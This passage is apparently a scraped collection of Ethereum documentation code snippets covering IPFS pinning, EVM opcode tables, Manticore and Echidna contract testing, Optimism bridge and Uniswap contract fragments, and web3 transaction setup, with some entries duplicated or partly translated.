javascript\nCODE:\n```\nrequire(\"dotenv\").config()\nconst key = process.env.REACT_APP_PINATA_KEY\nconst secret = process.env.REACT_APP_PINATA_SECRET\n\nconst axios = require(\"axios\")\n\nexport const pinJSONToIPFS = async (JSONBody) => {\n  const url = `https://api.pinata.cloud/pinning/pinJSONToIPFS`\n  //making axios POST request to Pinata ⬇️\n  return axios\n    .post(url, JSONBody, {\n      headers: {\n        pinata_api_key: key,\n        pinata_secret_api_key: secret,\n      },\n    })\n    .then(function (response) {\n      return {\n        success: true,\n        pinataUrl:\n          \"https://gateway.pinata.cloud/ipfs/\" + response.data.IpfsHash,\n      }\n    })\n    .catch(function (error) {\n      console.log(error)\n      return {\n        success: false,\n        message: error.message,\n      }\n    })\n}\n```\n\n----------------------------------------\n\nTITLE: Validating ERC-721 Receiver Implementation\nDESCRIPTION: Checks that the destination contract correctly implements the ERC721Receiver interface by verifying the return value matches the expected method signature.\n\nLANGUAGE: python\nCODE:\n```\n        # Throws if transfer destination is a contract which does not implement 'onERC721Received'\n        assert returnValue == method_id(\"onERC721Received(address,address,uint256,bytes)\", output_type=bytes32)\n```\n\n----------------------------------------\n\nTITLE: Bitwise Operations in EVM (EQ through SAR)\nDESCRIPTION: Fundamental bitwise and comparison operations in the Ethereum Virtual Machine including equality checking, zero checking, AND, OR, XOR, NOT, byte extraction, and bit shifting operations. Each operation costs 3 gas units.\n\nLANGUAGE: evm\nCODE:\n```\n14   | EQ             | a, b         | a == b                           | (u)int256 equality\n15   | ISZERO         | a            | a == 0                           | (u)int256 iszero\n16   | AND            | a, b         | a && b                           | bitwise AND\n17   | OR             | a, b         | a || b                           | bitwise OR\n18   | XOR            | a, b         | a ^ b                            | bitwise XOR\n19   | NOT            | a            | ~a                               | bitwise NOT\n1A   | BYTE           | i, x         | (x >> (248 - i * 8)) && 0xFF     | ith byte of (u)int256 x, from the left\n1B   | SHL            | shift, val   | val << shift                     | shift left\n1C   | SHR            | shift, val   | val >> shift                     | logical shift right\n1D   | SAR            | shift, val   | val >> shift                     | arithmetic shift right\n```\n\n----------------------------------------\n\nTITLE: Rendering Translatathon Calendar Component in React/JSX\nDESCRIPTION: A component that displays the calendar of events related to the Translatathon.\n\nLANGUAGE: jsx\nCODE:\n```\n<TranslatathonCalendar />\n```\n\n----------------------------------------\n\nTITLE: Finding Execution Paths that Throw Exceptions\nDESCRIPTION: Code for identifying execution paths that end with REVERT or INVALID opcodes and generating test cases for them using Manticore's state information and test case generation features.\n\nLANGUAGE: python\nCODE:\n```\nfrom manticore.ethereum import ManticoreEVM\n\nm = ManticoreEVM()\n\nwith open('example.sol') as f:\n    source_code = f.read()\n\nuser_account = m.create_account(balance=1000)\ncontract_account = m.solidity_create_contract(source_code, owner=user_account)\n\nsymbolic_var = m.make_symbolic_value()\ncontract_account.f(symbolic_var)\n\n## Check if an execution ends with a REVERT or INVALID\nfor state in m.terminated_states:\n    last_tx = state.platform.transactions[-1]\n    if last_tx.result in ['REVERT', 'INVALID']:\n        print('Throw found {}'.format(m.workspace))\n        m.generate_testcase(state, 'ThrowFound')\n```\n\n----------------------------------------\n\nTITLE: Checking if Address is a Contract in Solidity\nDESCRIPTION: Internal view function that determines if an address belongs to a contract by checking its code size using inline assembly. This is useful for implementing specific logic when interacting with contracts versus regular addresses.\n\nLANGUAGE: Solidity\nCODE:\n```\nfunction isContract(address account) internal view returns (bool) {\n    uint256 size;\n    // Currently there is no better way to check if there is a contract in an address\n    // than to check the size of the code at that address.\n    // See https://ethereum.stackexchange.com/a/14016/36603\n    // for more details about how this works.\n    // TODO Check this again before the Serenity release, because all addresses will be\n    // contracts then.\n    // solium-disable-next-line security/no-inline-assembly\n    assembly {\n        size := extcodesize(account)\n    }\n    return size > 0;\n}\n```\n\n----------------------------------------\n\nTITLE: Defining Ethereum Cache Size Constants\nDESCRIPTION: Two arrays defining numerical values for cache-related operations in Ethereum. The first unlabeled array contains memory addresses or block numbers, while the second labeled 'cache_sizes' array contains progressive cache size values in bytes.\n\nLANGUAGE: python\nCODE:\n```\ncache_sizes = [\n16776896, 16907456, 17039296, 17170112, 17301056, 17432512, 17563072,\n17693888, 17824192, 17955904, 18087488, 18218176, 18349504, 18481088,\n18611392, 18742336, 18874304, 19004224, 19135936, 19267264, 19398208,\n19529408, 19660096, 19791424, 19922752, 20053952, 20184896, 20315968,\n20446912, 20576576, 20709184, 20840384, 20971072, 21102272, 21233216,\n21364544, 21494848, 21626816, 21757376, 21887552, 22019392, 22151104,\n22281536, 22412224, 22543936, 22675264, 22806464, 22935872, 23068096,\n23198272, 23330752, 23459008, 23592512, 23723968, 23854912, 23986112,\n24116672, 24247616, 24378688, 24509504, 24640832, 24772544, 24903488,\n25034432, 25165376, 25296704, 25427392, 25558592, 25690048, 25820096,\n25951936, 26081728, 26214208, 26345024, 26476096, 26606656, 26737472,\n26869184, 26998208, 27131584, 27262528, 27393728, 27523904, 27655744,\n27786688, 27917888, 28049344, 28179904, 28311488, 28441792, 28573504,\n28700864, 28835648, 28966208, 29096768, 29228608, 29359808, 29490752,\n29621824, 29752256, 29882816, 30014912, 30144448, 30273728, 30406976,\n30538432, 30670784, 30799936, 30932672, 31063744, 31195072, 31325248,\n31456192, 31588288, 31719232, 31850432, 31981504, 32110784, 32243392,\n32372672, 32505664, 32636608, 32767808, 32897344, 33029824, 33160768,\n33289664, 33423296, 33554368, 33683648, 33816512, 33947456, 34076992,\n34208704, 34340032, 34471744, 34600256, 34734016, 34864576, 34993984,\n35127104, 35258176, 35386688, 35518528, 35650624, 35782336, 35910976,\n36044608, 36175808, 36305728, 36436672, 36568384, 36699968, 36830656,\n36961984, 37093312, 37223488, 37355072, 37486528, 37617472, 37747904,\n37879232, 38009792, 38141888, 38272448, 38403392, 38535104, 38660672,\n38795584, 38925632, 39059264, 39190336, 39320768, 39452096, 39581632,\n39713984, 39844928, 39974848, 40107968, 40238144, 40367168, 40500032,\n40631744, 40762816, 40894144, 41023552, 41155904, 41286208, 41418304,\n41547712, 41680448, 41811904, 41942848, 42073792, 42204992, 42334912,\n42467008, 42597824, 42729152, 42860096, 42991552, 43122368, 43253696,\n43382848, 43515712, 43646912, 43777088, 43907648, 44039104, 44170432,\n44302144, 44433344, 44564288, 44694976, 44825152, 44956864, 45088448,\n45219008, 45350464, 45481024, 45612608, 45744064, 45874496, 46006208,\n46136768, 46267712, 46399424, 46529344, 46660672, 46791488, 46923328,\n47053504, 47185856, 47316928, 47447872, 47579072, 47710144, 47839936,\n47971648, 48103232, 48234176, 48365248, 48496192, 48627136, 48757312,\n48889664, 49020736, 49149248, 49283008, 49413824, 49545152, 49675712,\n49807168, 49938368, 50069056, 50200256, 50331584, 50462656, 50593472,\n50724032, 50853952, 50986048, 51117632, 51248576, 51379904, 51510848,\n51641792, 51773248, 51903296, 52035136, 52164032, 52297664, 52427968,\n52557376, 52690112, 52821952, 52952896, 53081536, 53213504, 53344576,\n53475776, 53608384, 53738816, 53870528, 54000832, 54131776, 54263744,\n54394688, 54525248, 54655936, 54787904, 54918592, 55049152, 55181248,\n55312064, 55442752, 55574336, 55705024, 55836224, 55967168, 56097856,\n56228672, 56358592, 56490176, 56621888, 56753728, 56884928, 57015488,\n57146816, 57278272, 57409216, 57540416, 57671104, 57802432, 57933632,\n58064576, 58195264, 58326976, 58457408, 58588864, 58720192, 58849984,\n58981696, 59113024, 59243456, 59375552, 59506624, 59637568, 59768512,\n59897792, 60030016, 60161984, 60293056, 60423872, 60554432, 60683968,\n60817216, 60948032, 61079488, 61209664, 61341376, 61471936, 61602752,\n61733696, 61865792, 61996736, 62127808, 62259136, 62389568, 62520512,\n62651584, 62781632, 62910784, 63045056, 63176128, 63307072, 63438656,\n63569216, 63700928, 63831616, 63960896, 64093888, 64225088, 64355392,\n64486976, 64617664, 64748608, 64879424, 65009216, 65142464, 65273792,\n65402816, 65535424, 65666752, 65797696, 65927744, 66060224, 66191296,\n66321344, 66453056, 66584384, 66715328, 66846656, 66977728, 67108672,\n67239104, 67370432, 67501888, 67631296, 67763776, 67895104, 68026304,\n68157248, 68287936, 68419264, 68548288, 68681408, 68811968, 68942912,\n```\n\n----------------------------------------\n\nTITLE: Constructor and Withdrawal Functions for Optimism L2 Bridge\nDESCRIPTION: Constructor that initializes the bridge with cross-domain messenger and L1 bridge addresses, plus functions for initiating token withdrawals from L2 to L1.\n\nLANGUAGE: solidity\nCODE:\n```\n    /***************\n     * Constructor *\n     ***************/\n\n    /**\n     * @param _l2CrossDomainMessenger Cross-domain messenger used by this contract.\n     * @param _l1TokenBridge Address of the L1 bridge deployed to the main chain.\n     */\n    constructor(address _l2CrossDomainMessenger, address _l1TokenBridge)\n        CrossDomainEnabled(_l2CrossDomainMessenger)\n    {\n        l1TokenBridge = _l1TokenBridge;\n    }\n\n    /***************\n     * Withdrawing *\n     ***************/\n\n    /**\n     * @inheritdoc IL2ERC20Bridge\n     */\n    function withdraw(\n        address _l2Token,\n        uint256 _amount,\n        uint32 _l1Gas,\n        bytes calldata _data\n    ) external virtual {\n        _initiateWithdrawal(_l2Token, msg.sender, msg.sender, _amount, _l1Gas, _data);\n    }\n\n    /**\n     * @inheritdoc IL2ERC20Bridge\n     */\n    function withdrawTo(\n        address _l2Token,\n        address _to,\n        uint256 _amount,\n        uint32 _l1Gas,\n        bytes calldata _data\n    ) external virtual {\n        _initiateWithdrawal(_l2Token, msg.sender, _to, _amount, _l1Gas, _data);\n    }\n```\n\n----------------------------------------\n\nTITLE: RETURN Opcode (0xF3) Implementation in EVM\nDESCRIPTION: Halts execution and returns output data from a specified segment of memory.\n\nLANGUAGE: solidity\nCODE:\n```\nreturn mem[ost:ost+len-1]\n```\n\n----------------------------------------\n\nTITLE: Implementing ETH Receive Function for Default Deposits\nDESCRIPTION: Implements the receive function to handle direct ETH transfers to the bridge. This function deposits the ETH to the sender's L2 account with a default gas limit of 200,000. It's protected by the onlyEOA modifier to prevent accidental contract deposits.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev This function can be called with no data\n     * to deposit an amount of ETH to the caller's balance on L2.\n     * Since the receive function doesn't take data, a conservative\n     * default amount is forwarded to L2.\n     */\n    receive() external payable onlyEOA {\n        _initiateETHDeposit(msg.sender, msg.sender, 200_000, bytes(\"\"));\n    }\n```\n\n----------------------------------------\n\nTITLE: Implementing Account Freezing Logic in Solidity\nDESCRIPTION: The implementation of the freezeAccount function that checks if the account is already frozen, updates the frozen status, and emits an event to notify listeners about the state change.\n\nLANGUAGE: solidity\nCODE:\n```\n{\n    require(!frozenAccounts[addr], \"Account already frozen\");\n    frozenAccounts[addr] = true;\n    emit AccountFrozen(addr);\n}  // freezeAccount\n```\n\n----------------------------------------\n\nTITLE: Reentrancy Guard in Uniswap V2 Pair\nDESCRIPTION: Implements a reentrancy guard to prevent vulnerabilities from malicious ERC-20 contracts that might attempt to exploit the pool during token transfers.\n\nLANGUAGE: solidity\nCODE:\n```\nuint private unlocked = 1;\n```\n\n----------------------------------------\n\nTITLE: Implementing Account Freezing Function in Solidity\nDESCRIPTION: Defines a function that allows the contract owner to freeze an account. Uses the onlyOwner modifier from OpenZeppelin's Ownable contract to restrict access to this administrative function.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction freezeAccount(address addr)\n  public\n  onlyOwner\n```\n\n----------------------------------------\n\nTITLE: Testing Event Emission in Foundry\nDESCRIPTION: Shows how to test that a contract correctly emits specific events with expected indexed parameters using Foundry's vm.expectEmit functionality.\n\nLANGUAGE: solidity\nCODE:\n```\n    event EntryWritten(uint indexed key, uint indexed value);\n\n        .\n        .\n        .\n\n        _callInput = bytes.concat(\n            worm.WRITE_ENTRY_CACHED(), worm.encodeVal(a), worm.encodeVal(b));\n        vm.expectEmit(true, true, false, false);\n        emit EntryWritten(a, b);\n        (_success,) = address(worm).call(_callInput);\n```\n\n----------------------------------------\n\nTITLE: Complete Example of Running Manticore Analysis\nDESCRIPTION: A full example showing how to set up Manticore, create accounts, deploy a contract, execute a function with symbolic values, and finalize exploration.\n\nLANGUAGE: python\nCODE:\n```\nfrom manticore.ethereum import ManticoreEVM\n\nm = ManticoreEVM()\n\nwith open('example.sol') as f:\n    source_code = f.read()\n\nuser_account = m.create_account(balance=1000)\ncontract_account = m.solidity_create_contract(source_code, owner=user_account)\n\nsymbolic_var = m.make_symbolic_value()\ncontract_account.f(symbolic_var)\n\nprint(\"Rezultatele sunt în {}\".format(m.workspace))\nm.finalize() # oprește explorarea\n```\n\n----------------------------------------\n\nTITLE: Smart Contract with Gas-Varying Operations in Solidity\nDESCRIPTION: A Solidity smart contract example that demonstrates operations with varying gas costs. It includes functions to push, pop, clear an array, and check for duplicates, with gas consumption dependent on array size.\n\nLANGUAGE: solidity\nCODE:\n```\ncontract C {\n  address [] addrs;\n  function push(address a) public {\n    addrs.push(a);\n  }\n  function pop() public {\n    addrs.pop();\n  }\n  function clear() public{\n    addrs.length = 0;\n  }\n  function check() public{\n    for(uint256 i = 0; i < addrs.length; i++)\n      for(uint256 j = i+1; j < addrs.length; j++)\n        if (addrs[i] == addrs[j])\n          addrs[j] = address(0x0);\n  }\n  function echidna_test() public returns (bool) {\n      return true;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: TransferHelper Library Definition and safeApprove\nDESCRIPTION: A helper library that adds safety checks around ERC-20 and ETH transfers to handle different token implementations consistently. The safeApprove function calls the ERC-20 approve method with additional error handling.\n\nLANGUAGE: solidity\nCODE:\n```\n// SPDX-License-Identifier: GPL-3.0-or-later\n\npragma solidity >=0.6.0;\n\n// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false\nlibrary TransferHelper {\n    function safeApprove(\n        address token,\n        address to,\n        uint256 value\n    ) internal {\n        // bytes4(keccak256(bytes('approve(address,uint256)')));\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));\n        require(\n            success && (data.length == 0 || abi.decode(data, (bool))),\n            'TransferHelper::safeApprove: approve failed'\n        );\n    }\n```\n\n----------------------------------------\n\nTITLE: Environment Variables Structure for NFT Minting\nDESCRIPTION: Structure of the .env file containing the API URL, private key, and public key needed for connecting to Ethereum and signing transactions.\n\nLANGUAGE: javascript\nCODE:\n```\nAPI_URL = \"https://eth-sepolia.g.alchemy.com/v2/your-api-key\"\nPRIVATE_KEY = \"your-private-account-address\"\nPUBLIC_KEY = \"your-public-account-address\"\n```\n\n----------------------------------------\n\nTITLE: Defining Ethereum Transaction Parameters\nDESCRIPTION: JavaScript code to create a transaction object with required parameters for sending Ether, including sender, receiver, amount, nonce, gas limit, and gas price.\n\nLANGUAGE: javascript\nCODE:\n```\nconst tx = {\n  from: send_account,\n  to: to_address,\n  value: ethers.utils.parseEther(send_token_amount),\n  nonce: window.ethersProvider.getTransactionCount(send_account, \"latest\"),\n  gasLimit: ethers.utils.hexlify(gas_limit), // 100000\n  gasPrice: gas_price,\n}\n```\n\n----------------------------------------\n\nTITLE: Reading Values from Calldata\nDESCRIPTION: Private utility function that reads a value from the calldata starting at a specific byte position with specified length, using assembly for direct CALLDATALOAD operations.\n\nLANGUAGE: solidity\nCODE:\n```\n    function calldataVal(uint startByte, uint length)\n        private pure returns (uint) {\n        uint _retVal;\n\n        require(length < 0x21,\n            \"calldataVal length limit is 32 bytes\");\n\n        require(length + startByte <= msg.data.length,\n            \"calldataVal trying to read beyond calldatasize\");\n\n        assembly {\n            _retVal := calldataload(startByte)\n        }\n\n        _retVal = _retVal >> (256-length*8);\n\n        return _retVal;\n    }\n```\n\n----------------------------------------\n\nTITLE: Defining finalizeERC20Withdrawal Function for L2 to L1 Token Transfers\nDESCRIPTION: Function to complete a withdrawal from L2 to L1, crediting funds to the recipient on L1. This function is the second step in the L2→L1 transfer process and can only be called after the challenge period has ended.\n\nLANGUAGE: solidity\nCODE:\n```\n    /*************************\n     * Cross-chain Functions *\n     *************************/\n\n    /**\n     * @dev Complete a withdrawal from L2 to L1, and credit funds to the recipient's balance of the\n     * L1 ERC20 token.\n     * This call will fail if the initialized withdrawal from L2 has not been finalized.\n     *\n     * @param _l1Token Address of L1 token to finalizeWithdrawal for.\n     * @param _l2Token Address of L2 token where withdrawal was initiated.\n     * @param _from L2 address initiating the transfer.\n     * @param _to L1 address to credit the withdrawal to.\n     * @param _amount Amount of the ERC20 to deposit.\n     * @param _data Data provided by the sender on L2. This data is provided\n     *   solely as a convenience for external contracts. Aside from enforcing a maximum\n     *   length, these contracts provide no guarantees about its content.\n     */\n    function finalizeERC20Withdrawal(\n        address _l1Token,\n        address _l2Token,\n        address _from,\n        address _to,\n        uint256 _amount,\n        bytes calldata _data\n    ) external;\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Transaction Details in Web3.py\nDESCRIPTION: Gets detailed information about a specific transaction using its hash. Includes information such as block number, transaction index, sender, recipient, and value transferred.\n\nLANGUAGE: python\nCODE:\n```\nw3.eth.get_transaction(tx_hash)\n```\n\n----------------------------------------\n\nTITLE: Running Echidna with Config File for Corpus Collection\nDESCRIPTION: This command runs Echidna against the magic.sol contract using a custom configuration file that enables corpus collection.\n\nLANGUAGE: bash\nCODE:\n```\nechidna-test magic.sol --config config.yaml\n```\n\n----------------------------------------\n\nTITLE: Defining Token Metadata Variables\nDESCRIPTION: Declares private state variables for token metadata: name, symbol, and decimals. These provide human-readable information about the token and define its divisibility.\n\nLANGUAGE: solidity\nCODE:\n```\n    string private _name;\n    string private _symbol;\n    uint8 private _decimals;\n```\n\n----------------------------------------\n\nTITLE: L2StandardERC20 State Variables\nDESCRIPTION: Declaration of state variables in the L2StandardERC20 contract that track the corresponding L1 token address and the L2 bridge address that is authorized to mint and burn tokens.\n\nLANGUAGE: solidity\nCODE:\n```\nimport \"./IL2StandardERC20.sol\";\n\ncontract L2StandardERC20 is IL2StandardERC20, ERC20 {\n    address public l1Token;\n    address public l2Bridge;\n```\n\n----------------------------------------\n\nTITLE: Ethereum EVM Opcodes Table (0x38-0x50)\nDESCRIPTION: This code snippet displays a table of Ethereum Virtual Machine (EVM) opcodes with their hexadecimal values, gas costs, stack effects, and descriptions. It includes essential operations for smart contract development and interaction with the Ethereum blockchain.\n\nLANGUAGE: markdown\nCODE:\n```\n|  38   | CODESIZE       |                                                2                                                | `.`                                              | `len(this.code)`                             |                                                                               | length of executing contract's code, in bytes                                                                                                                         |\n|  39   | CODECOPY       |         [A3](https://github.com/wolflo/evm-opcodes/blob/main/gas.md#a3-copy-operations)         | `dstOst, ost, len`                               | `.`                                          |                                                                               | mem[dstOst:dstOst+len-1] := this.code[ost:ost+len-1]                                                                             | copy executing contract's bytecode |\n|  3A   | GASPRICE       |                                                2                                                | `.`                                              | `tx.gasprice`                                |                                                                               | gas price of tx, in wei per unit gas [\\*\\*](https://eips.ethereum.org/EIPS/eip-1559#gasprice)                                                                     |\n|  3B   | EXTCODESIZE    | [A5](https://github.com/wolflo/evm-opcodes/blob/main/gas.md#a5-balance-extcodesize-extcodehash) | `addr`                                           | `len(addr.code)`                             |                                                                               | size of code at addr, in bytes                                                                                                                                        |\n|  3C   | EXTCODECOPY    |           [A4](https://github.com/wolflo/evm-opcodes/blob/main/gas.md#a4-extcodecopy)           | `addr, dstOst, ost, len`                         | `.`                                          | mem[dstOst:dstOst+len-1] := addr.code[ost:ost+len-1]                          | copy code from `addr`                                                                                                                                                 |\n|  3D   | RETURNDATASIZE |                                                2                                                | `.`                                              | `size`                                       |                                                                               | size of returned data from last external call, in bytes                                                                                                               |\n|  3E   | RETURNDATACOPY |         [A3](https://github.com/wolflo/evm-opcodes/blob/main/gas.md#a3-copy-operations)         | `dstOst, ost, len`                               | `.`                                          | mem[dstOst:dstOst+len-1] := returndata[ost:ost+len-1]                         | copy returned data from last external call                                                                                                                            |\n|  3F   | EXTCODEHASH    | [A5](https://github.com/wolflo/evm-opcodes/blob/main/gas.md#a5-balance-extcodesize-extcodehash) | `addr`                                           | `hash`                                       |                                                                               | hash = addr.exists ? keccak256(addr.code) : 0                                                                                                                         |\n|  40   | BLOCKHASH      |                                               20                                                | `blockNum`                                       | `blockHash(blockNum)`                        |                                                                               |                                                                                                                                                                       |\n|  41   | COINBASE       |                                                2                                                | `.`                                              | `block.coinbase`                             |                                                                               | address of proposer of current block                                                                                                                                  |\n|  42   | TIMESTAMP      |                                                2                                                | `.`                                              | `block.timestamp`                            |                                                                               | timestamp of current block                                                                                                                                            |\n|  43   | NUMBER         |                                                2                                                | `.`                                              | `block.number`                               |                                                                               | number of current block                                                                                                                                               |\n|  44   | PREVRANDAO     |                                                2                                                | `.`                                              | `randomness beacon`                          |                                                                               | randomness beacon                                                                                                                                                     |\n|  45   | GASLIMIT       |                                                2                                                | `.`                                              | `block.gaslimit`                             |                                                                               | gas limit of current block                                                                                                                                            |\n|  46   | CHAINID        |                                                2                                                | `.`                                              | `chain_id`                                   |                                                                               | push current [chain id](https://eips.ethereum.org/EIPS/eip-155) onto stack                                                                                            |\n|  47   | SELFBALANCE    |                                                5                                                | `.`                                              | `address(this).balance`                      |                                                                               | balance of executing contract, in wei                                                                                                                                 |\n|  48   | BASEFEE        |                                                2                                                | `.`                                              | `block.basefee`                              |                                                                               | base fee of current block                                                                                                                                             |\n|  49   | BLOBHASH       |                                                3                                                | `idx`                                            | `tx.blob_versioned_hashes[idx]`              |                                                                               | [EIP-4844](https://eips.ethereum.org/EIPS/eip-4844)                                                                                                                   |\n|  4A   | BLOBBASEFEE    |                                                2                                                | `.`                                              | `block.blobbasefee`                          |                                                                               | blob base fee of current block ([EIP-7516](https://eips.ethereum.org/EIPS/eip-7516))                                                                                  |\n| 4B-4F | _invalid_      |                                                                                                 |                                                  |                                              |                                                                               |                                                                                                                                                                       |\n|  50   | POP            |                                                2                                                | `_anon`                                          | `.`                                          |                                                                               | remove item from top of stack and discard it                                                                                                                          |\n```\n\n----------------------------------------\n\nTITLE: FinalizeERC20Withdrawal Function for Completing L2→L1 Token Transfers\nDESCRIPTION: Defines the finalizeERC20Withdrawal function that completes the withdrawal process from L2 to L1 for ERC-20 tokens. This function is called after the challenge period to finalize the transfer.\n\nLANGUAGE: solidity\nCODE:\n```\n    /*************************\n     * Cross-chain Functions *\n     *************************/\n\n    /**\n     * @dev Complete a withdrawal from L2 to L1, and credit funds to the recipient's balance of the\n     * L1 ERC20 token.\n     * This call will fail if the initialized withdrawal from L2 has not been finalized.\n     *\n     * @param _l1Token Address of L1 token to finalizeWithdrawal for.\n     * @param _l2Token Address of L2 token where withdrawal was initiated.\n     * @param _from L2 address initiating the transfer.\n     * @param _to L1 address to credit the withdrawal to.\n     * @param _amount Amount of the ERC20 to deposit.\n     * @param _data Data provided by the sender on L2. This data is provided\n     *   solely as a convenience for external contracts. Aside from enforcing a maximum\n     *   length, these contracts provide no guarantees about its content.\n     */\n    function finalizeERC20Withdrawal(\n        address _l1Token,\n        address _l2Token,\n        address _from,\n        address _to,\n        uint256 _amount,\n        bytes calldata _data\n    ) external;\n}\n```\n\n----------------------------------------\n\nTITLE: REVERT Operation in EVM (FD)\nDESCRIPTION: Halts execution and reverts state changes, while returning data from memory as an error message. Used for handling error conditions.\n\nLANGUAGE: solidity\nCODE:\n```\nrevert(mem[ost:ost+len-1])\n```\n\n----------------------------------------\n\nTITLE: Overflow Detection and Conditional Jump in EVM Bytecode\nDESCRIPTION: This section checks if the stored value is less than or equal to the bitwise NOT of the call value, jumping to 0x01DF if true (no overflow). Otherwise, it would continue execution and eventually revert the transaction.\n\nLANGUAGE: EVM Bytecode\nCODE:\n```\n| Décalage | Opcode       | Pile                                                                            |\n| --------:| ------------ | ------------------------------------------------------------------------------- |\n|      1AC | DUP3         | Value* 2^256-CALLVALUE-1 0x00 Value* CALLVALUE 0x75 0 6 CALLVALUE         |\n|      1AD | GT           | Value*>2^256-CALLVALUE-1 0x00 Value* CALLVALUE 0x75 0 6 CALLVALUE         |\n|      1AE | ISZERO       | Value*<=2^256-CALLVALUE-1 0x00 Value* CALLVALUE 0x75 0 6 CALLVALUE        |\n|      1AF | PUSH2 0x01df | 0x01DF Value*<=2^256-CALLVALUE-1 0x00 Value* CALLVALUE 0x75 0 6 CALLVALUE |\n|      1B2 | JUMPI        |                                                                                 |\n```\n\n----------------------------------------\n\nTITLE: Storing Constant Product Value in Uniswap\nDESCRIPTION: Tracks the product of reserve0 * reserve1 after the most recent liquidity event. This value is central to Uniswap's constant product formula that determines exchange rates.\n\nLANGUAGE: solidity\nCODE:\n```\nuint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event\n```\n\n----------------------------------------\n\nTITLE: Updating Deposits Tracking in ERC-20 Bridge\nDESCRIPTION: This code updates the deposits data structure by subtracting the withdrawal amount from the tracked deposits for a specific L1/L2 token pair.\n\nLANGUAGE: solidity\nCODE:\n```\n        deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] - _amount;\n```\n\n----------------------------------------\n\nTITLE: Handling Low-Level Call Results in Solidity Tests\nDESCRIPTION: Shows how to handle response values from low-level calls when only the success status is needed, discarding the return data.\n\nLANGUAGE: solidity\nCODE:\n```\n        (_success,) = address(worm).call(_callInput);\n```\n\n----------------------------------------\n\nTITLE: EVM Opcodes Table Fragment (0x38-0x50)\nDESCRIPTION: A structured table documenting EVM opcodes from CODESIZE (0x38) to POP (0x50), including gas costs, stack operations, and functionality descriptions. This reference is useful for understanding low-level EVM operation during smart contract execution.\n\nLANGUAGE: markdown\nCODE:\n```\n|    38    | CODESIZE       |                                                2                                                | `.`                                              | `len(this.code)`                             |                                                                               | length of executing contract's code, in bytes                                                                                                                         |\n|    39    | CODECOPY       |         [A3](https://github.com/wolflo/evm-opcodes/blob/main/gas.md#a3-copy-operations)         | `dstOst, ost, len`                               | `.`                                          |                                                                               | mem[dstOst:dstOst+len-1] := this.code[ost:ost+len-1]                                                                             | copy executing contract's bytecode |\n|    3A    | GASPRICE       |                                                2                                                | `.`                                              | `tx.gasprice`                                |                                                                               | gas price of tx, in wei per unit gas [\\*\\*](https://eips.ethereum.org/EIPS/eip-1559#gasprice)                                                                     |\n|    3B    | EXTCODESIZE    | [A5](https://github.com/wolflo/evm-opcodes/blob/main/gas.md#a5-balance-extcodesize-extcodehash) | `addr`                                           | `len(addr.code)`                             |                                                                               | size of code at addr, in bytes                                                                                                                                        |\n|    3C    | EXTCODECOPY    |           [A4](https://github.com/wolflo/evm-opcodes/blob/main/gas.md#a4-extcodecopy)           | `addr, dstOst, ost, len`                         | `.`                                          | mem[dstOst:dstOst+len-1] := addr.code[ost:ost+len-1]                          | copy code from `addr`                                                                                                                                                 |\n|    3D    | RETURNDATASIZE |                                                2                                                | `.`                                              | `size`                                       |                                                                               | size of returned data from last external call, in bytes                                                                                                               |\n|    3E    | RETURNDATACOPY |         [A3](https://github.com/wolflo/evm-opcodes/blob/main/gas.md#a3-copy-operations)         | `dstOst, ost, len`                               | `.`                                          | mem[dstOst:dstOst+len-1] := returndata[ost:ost+len-1]                         | copy returned data from last external call                                                                                                                            |\n|    3F    | EXTCODEHASH    | [A5](https://github.com/wolflo/evm-opcodes/blob/main/gas.md#a5-balance-extcodesize-extcodehash) | `addr`                                           | `hash`                                       |                                                                               | hash = addr.exists ? keccak256(addr.code) : 0                                                                                                                         |\n|    40    | BLOCKHASH      |                                               20                                                | `blockNum`                                       | `blockHash(blockNum)`                        |                                                                               |                                                                                                                                                                       |\n|    41    | COINBASE       |                                                2                                                | `.`                                              | `block.coinbase`                             |                                                                               | adresa navrhovatele aktuálního bloku                                                                                                                                  |\n|    42    | TIMESTAMP      |                                                2                                                | `.`                                              | `block.timestamp`                            |                                                                               | timestamp of current block                                                                                                                                            |\n|    43    | NUMBER         |                                                2                                                | `.`                                              | `block.number`                               |                                                                               | number of current block                                                                                                                                               |\n|    44    | PREVRANDAO     |                                                2                                                | `.`                                              | `randomness beacon`                          |                                                                               | randomness beacon                                                                                                                                                     |\n|    45    | GASLIMIT       |                                                2                                                | `.`                                              | `block.gaslimit`                             |                                                                               | gas limit of current block                                                                                                                                            |\n|    46    | CHAINID        |                                                2                                                | `.`                                              | `chain_id`                                   |                                                                               | push current [chain id](https://eips.ethereum.org/EIPS/eip-155) onto stack                                                                                            |\n|    47    | SELFBALANCE    |                                                5                                                | `.`                                              | `address(this).balance`                      |                                                                               | balance of executing contract, in wei                                                                                                                                 |\n|    48    | BASEFEE        |                                                2                                                | `.`                                              | `block.basefee`                              |                                                                               | base fee of current block                                                                                                                                             |\n|    49    | BLOBHASH       |                                                3                                                | `idx`                                            | `tx.blob_versioned_hashes[idx]`              |                                                                               | [EIP-4844](https://eips.ethereum.org/EIPS/eip-4844)                                                                                                                   |\n|    4A    | BLOBBASEFEE    |                                                2                                                | `.`                                              | `block.blobbasefee`                          |                                                                               | blob base fee of current block ([EIP-7516](https://eips.ethereum.org/EIPS/eip-7516))                                                                                  |\n|  4B-4F   | _invalid_      |                                                                                                 |                                                  |                                              |                                                                               |                                                                                                                                                                       |\n|    50    | POP            |                                                2                                                | `_anon`                                          | `.`                                          |                                                                               | remove item from top of stack and discard it                                                                                                                          |\n```\n\n----------------------------------------\n\nTITLE: Instanciation du contrat et configuration des adresses\nDESCRIPTION: Initialisation de web3.js avec une connexion locale, création d'une instance du contrat DAI et définition des adresses d'expéditeur et de destinataire pour les transferts.\n\nLANGUAGE: javascript\nCODE:\n```\nconst web3 = new Web3(\"http://localhost:8545\")\n\nconst daiToken = new web3.eth.Contract(ERC20TransferABI, DAI_ADDRESS)\n\nconst senderAddress = \"0x4d10ae710Bd8D1C31bd7465c8CBC3add6F279E81\"\nconst receiverAddress = \"0x19dE91Af973F404EDF5B4c093983a7c6E3EC8ccE\"\n```\n\n----------------------------------------\n\nTITLE: Exemples de mots de passe faibles et 